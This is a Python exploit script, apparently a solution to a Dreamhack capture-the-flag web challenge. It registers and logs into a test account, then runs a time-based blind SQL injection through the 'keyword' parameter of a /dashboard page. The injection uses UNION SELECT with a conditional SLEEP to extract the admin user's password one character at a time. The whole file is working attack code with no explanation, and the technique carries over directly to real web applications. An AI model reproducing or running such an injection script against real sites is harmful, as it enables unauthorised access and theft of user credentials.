import requests
import string
import time

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.session = requests.Session()
        self.username = "attacker123"
        self.password = "attacker123"
        self.charset = string.ascii_lowercase + string.ascii_uppercase + string.ascii_letters + string.digits + "_{}-!@#$%^&*()[];:,.<>?/|\\`~"

    def register(self):
        data = {"username": self.username, "password": self.password}
        print(f"[+] Registering user {self.username}")
        response = requests.post(f"{self.baseURL}/register", data=data, timeout=10)
        if response.status_code == 200 and ("successful" in response.text.lower() or "exists" in response.text.lower()):
            print("[+] Registration okay")
        else:
            print(f"[-] Registration failed: {response.status_code}")

    def login(self):
        data = {"username": self.username, "password": self.password}
        print(f"[+] Logging in as {self.username}")
        response = self.session.post(
            f"{self.baseURL}/login",
            data=data,
            allow_redirects=False,  
            timeout=10
        )
        if response.status_code in (302, 303):
            print("[+] Login Successful")
        else:
            print(f"[-] Login Failed: {response.status_code}")

    def extract_value(self):
        ENDPOINT_TARGET = "/dashboard"
        PARAM_PAYLOAD = "keyword"
        password = ''
        position = 1
        while True:
            found = False
            for character in self.charset:
                payload = f'union select 1,"2","3","4",if(substring((select password from users where username="admin"),{position},1)="{character}",sleep(6),"5")-- -\\'
                startTime = time.time()
                self.session.get(f"{self.baseURL}{ENDPOINT_TARGET}", params={PARAM_PAYLOAD: payload})
                endTime = time.time() - startTime
                if endTime >= 4:
                    password += ''.join(character)
                    position += 1
                    print(f"[+] Found Password Admin: {password}", end='\r')
                    found = True
                    break
            if not found:
                print(f"[+] ADMIN PASSWORD COMPLETED: {password}")
                break

if __name__ == "__main__":
    BASE_URL = "http://host3.dreamhack.games:13107"
    exploit = Exploit(BASE_URL)
    exploit.register()
    exploit.login()
    exploit.extract_value()
